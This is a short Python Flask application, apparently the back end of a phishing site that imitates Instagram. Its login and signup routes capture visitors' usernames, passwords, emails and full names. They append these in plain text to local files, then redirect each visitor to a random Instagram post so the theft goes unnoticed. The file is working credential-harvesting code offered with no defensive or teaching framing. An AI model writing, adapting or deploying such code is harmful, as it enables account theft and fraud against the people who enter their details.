from flask import Flask, request, redirect
import random

app = Flask(__name__)

def guardar_datos(datos, tipo):
    with open(f'{tipo}_data.txt', 'a') as f:
        f.write(str(datos) + '\n')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    guardar_datos({'username': username, 'password': password}, 'login')
    # Redirigir a una página aleatoria de Instagram
    instagram_urls = ["https://www.instagram.com/p/RANDOM1/", "https://www.instagram.com/p/RANDOM2/", "https://www.instagram.com/p/RANDOM3/"]
    return redirect(random.choice(instagram_urls))

@app.route('/signup', methods=['POST'])
def signup():
    email = request.form['email']
    fullName = request.form['fullName']
    username = request.form['username']
    password = request.form['password']
    guardar_datos({'email': email, 'fullName': fullName, 'username': username, 'password': password}, 'signup')
    # Redirigir a una página aleatoria de Instagram
    instagram_urls = ["https://www.instagram.com/p/ANOTHER1/", "https://www.instagram.com/p/ANOTHER2/", "https://www.instagram.com/p/ANOTHER3/"]
    return redirect(random.choice(instagram_urls))

if __name__ == '__main__':
    app.run(debug=True)